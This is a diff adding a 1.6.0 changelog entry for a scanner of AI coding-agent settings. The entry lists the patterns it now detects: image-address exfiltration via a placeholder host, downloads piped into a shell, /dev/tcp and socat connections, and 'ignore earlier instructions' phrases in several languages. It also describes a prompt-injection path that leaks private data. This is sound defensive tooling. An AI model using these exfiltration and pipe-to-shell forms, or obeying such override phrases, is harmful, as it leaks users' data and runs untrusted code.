@@ -1,5 +1,24 @@
 # Changelog
 
+## 1.6.0
+
+- `--fix` makes the fixes that can be made for you: it turns off Claude Code's bypass mode, takes out allow rules that let it run any command, sets Codex's `approval_policy` to `"on-request"`, turns off VS Code's tool auto-approval, and pins an MCP server's package to the version `npx` last installed on this computer, when it runs as `npx PACKAGE` with no version.
+- It lists each change with the lines it touches and asks first. Each file is changed in place with its comments and format, and only if it then reads back as exactly that change. Every file is backed up to `~/.misconfig/backups` before any is written.
+- `--undo` puts back what the last `--fix` changed, and each run goes back one more. A file is put back only if it's still what `--fix` wrote, so an edit made since is never lost.
+- `--fix` never changes a link, a read-only file, another user's file, a file outside the project and the home folder, `~/.claude.json`, a plugin's files, or a project's files in a template, example or test folder. It makes no network request and doesn't run in CI.
+- On a computer with a history, `--fix` leaves a risk you've accepted as it is. What it changes in the computer's settings is recorded as an edit by `misconfig --fix`, approved by you, so the next check doesn't ask who made the change. What `--undo` puts back is recorded as an edit by `misconfig --undo` and waits for your approval. `--no-history` leaves the history alone.
+- The report ends with the `--fix` command when there's something it can fix, and the page `--open` saves marks each finding it can. `--json` has what would change under a finding's `autofix`.
+- New: an attack path, when one agent takes in untrusted content, such as GitHub issues or web pages, can read private data and can send data out, and none of it asks first. Each is ordinary on its own; together, one prompt injection can leak the data. It's reported for well-known MCP servers and Claude Code's own tools, with the one change that ends it.
+- New: an instruction file that asks the agent to put data in an image's address, such as `![](https://host/log?d=SESSION_DATA)`, is reported. The image loads as soon as the reply is shown and sends what the agent filled in.
+- A download piped into a shell is caught in more of the forms installers use: with variables or `env` before the shell (`curl … | INSTALL_DIR=/opt sh`), through other commands (`curl … | tee install.log | bash`), with `|&`, with the shell's folder (`| /bin/sh`), and with `;`, `&` or `|` inside a quoted address or header. 1.5 missed these.
+- Caught now: inline Python, Node and other code in a hook or MCP server that downloads and runs code or uses the network, connections through `/dev/tcp` and `socat`, orders to ignore earlier instructions in Spanish, French, German, Portuguese, Italian and Chinese, and "run with the sandbox disabled".
+- Fewer false alarms. A download piped into code that only reads it, as in `curl … | python3 -c "import json,sys; print(json.load(sys.stdin)['version'])"`, `node -p`, `perl -ne` or `python3 -m json.tool`, isn't reported as code that runs; code that runs what it reads still is. `curl | sh` with nothing to download, as a list of blocked commands has it, isn't reported. A Discord webhook address with a placeholder instead of an ID isn't reported. A secret file mentioned in passing isn't reported as a request to read it. `--dangerously-skip-permissions` in a project's notes is reported once, as the option it is.
+- A file a project names with a backslash, such as `.claude\settings.json` on macOS or Linux, is read as that one name. Before, it could stand in for the real `.claude/settings.json` and keep that file's settings out of the check.
+- A secret masked inside a quoted string can no longer break a settings file and keep its settings out of the check.
+- Goose's settings on Windows and Codex's settings in `/etc/codex` are checked, and OpenCode and Amp plugins in `~/.config` are listed.
+- Claude Code plugins are read and named the same way when `CLAUDE_CONFIG_DIR` moves them, a home folder reached through a link is still the home folder, and a file with thousands of MCP servers is checked in seconds.
+- Findings at the same level come in the same order on every computer, whatever its language, and the files in a settings folder are read in name order.
+
 ## 1.5.0
 
 - `--jsonl` prints the findings as JSON Lines: one finding on each line, worst first, with the same keys every time, for jq, grep and log collectors. The README lists the keys, and a 1.x release won't rename or remove one. Marks that reorder text, and characters that some programs treat as line breaks, are written as `\u` escapes, so a checked file can't add a line or change how one reads on screen.
